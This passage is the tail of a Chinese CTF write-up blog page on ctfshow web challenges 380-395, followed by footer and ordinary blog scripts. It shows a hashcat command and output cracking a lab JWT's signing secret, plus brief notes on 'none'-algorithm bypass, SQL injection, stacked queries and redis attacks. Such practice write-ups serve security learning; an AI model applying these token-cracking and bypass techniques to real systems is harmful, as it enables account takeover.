class="line">Restore.Sub.<span class="comment">#1...: Salt:0 Amplifier:0-128 Iteration:0-128</span></span><br><span class="line">Restore.Sub.<span class="comment">#3...: Salt:0 Amplifier:8-16 Iteration:0-8</span></span><br><span class="line">Candidate.Engine.: Device Generator</span><br><span class="line">Candidates.<span class="comment">#1....: sanier -&gt; co1fna</span></span><br><span class="line">Candidates.<span class="comment">#3....: locgce -&gt; hahsit</span></span><br><span class="line">Hardware.Mon.<span class="comment">#1..: Temp: 74c Util: 88% Core:1928MHz Mem:7143MHz Bus:8</span></span><br><span class="line">Hardware.Mon.<span class="comment">#3..: Util: 42% Core: 400MHz Mem:1600MHz Bus:16</span></span><br><span class="line"></span><br><span class="line">Started: Wed Jun <span class="number">29</span> <span class="number">13</span>:<span class="number">52</span>:<span class="number">03</span> <span class="number">2022</span></span><br><span class="line">Stopped: Wed Jun <span class="number">29</span> <span class="number">13</span>:<span class="number">52</span>:<span class="number">14</span> <span class="number">2022</span></span><br><span class="line"><span class="built_in">PS</span> F:\tools\hashcat<span class="literal">-6</span>.<span class="number">2.5</span>&gt; .\hashcat.exe F:\test\ctfshow\web389\jwts.txt <span class="literal">-m</span> <span class="number">16500</span> <span class="literal">-a</span> <span class="number">3</span> <span class="literal">--show</span></span><br><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY1NjQ3OTgyMywiZXhwIjoxNjU2NDg3MDIzLCJuYmYiOjE2NTY0Nzk4MjMsInN1YiI                                                                                                           I6InVzZXIiLCJqdGkiOiIzM2I0YTY2OGU5MTkyNGMwNTA4YjM1ZmQyNWZkMGJhNSJ9.ZzjuyloP4QbTNjW1GA6VG_W0<span class="literal">-r9MdlF_UwU8XFCbGO4</span>:<span class="number">123456</span></span><br></pre></td></tr></table></figure>
<p>390-393:<br>后面怎么一直 none 通杀额，原来是要考 sql 注入了吗。。。<br>394:<br>/flag 又没了，flag 又跑 check.php 去了<br>395:<br>这题还是可以 none 额，看了下其他师傅的 wp，原来还有堆叠和 redis 可以打，这算非预期吗。。。  </p>

  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/links/">links</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web380"><span class="toc-number">1.</span> <span class="toc-text">web380</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web381"><span class="toc-number">2.</span> <span class="toc-text">web381</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web382-383"><span class="toc-number">3.</span> <span class="toc-text">web382-383</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web384"><span class="toc-number">4.</span> <span class="toc-text">web384</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web385-386"><span class="toc-number">5.</span> <span class="toc-text">web385-386</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web387"><span class="toc-number">6.</span> <span class="toc-text">web387</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web388"><span class="toc-number">7.</span> <span class="toc-text">web388</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web389-395"><span class="toc-number">8.</span> <span class="toc-text">web389-395</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.477.moe/2022/06/29/ctfshow-web-getting-started-black-box/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.477.moe/2022/06/29/ctfshow-web-getting-started-black-box/&text=Practice - CTFSHOW WEB入门 黑盒测试篇"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://blog.477.moe/2022/06/29/ctfshow-web-getting-started-black-box/&title=Practice - CTFSHOW WEB入门 黑盒测试篇"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.477.moe/2022/06/29/ctfshow-web-getting-started-black-box/&is_video=false&description=Practice - CTFSHOW WEB入门 黑盒测试篇"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Practice - CTFSHOW WEB入门 黑盒测试篇&body=Check out this article: https://blog.477.moe/2022/06/29/ctfshow-web-getting-started-black-box/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://blog.477.moe/2022/06/29/ctfshow-web-getting-started-black-box/&title=Practice - CTFSHOW WEB入门 黑盒测试篇"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://blog.477.moe/2022/06/29/ctfshow-web-getting-started-black-box/&title=Practice - CTFSHOW WEB入门 黑盒测试篇"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://blog.477.moe/2022/06/29/ctfshow-web-getting-started-black-box/&title=Practice - CTFSHOW WEB入门 黑盒测试篇"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://blog.477.moe/2022/06/29/ctfshow-web-getting-started-black-box/&title=Practice - CTFSHOW WEB入门 黑盒测试篇"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://blog.477.moe/2022/06/29/ctfshow-web-getting-started-black-box/&name=Practice - CTFSHOW WEB入门 黑盒测试篇&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://blog.477.moe/2022/06/29/ctfshow-web-getting-started-black-box/&t=Practice - CTFSHOW WEB入门 黑盒测试篇"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2021-2022
    b_y
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/links/">links</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.7/dist/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'recharging-runtime';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>

<!-- utterances Comments -->

</body>
</html>
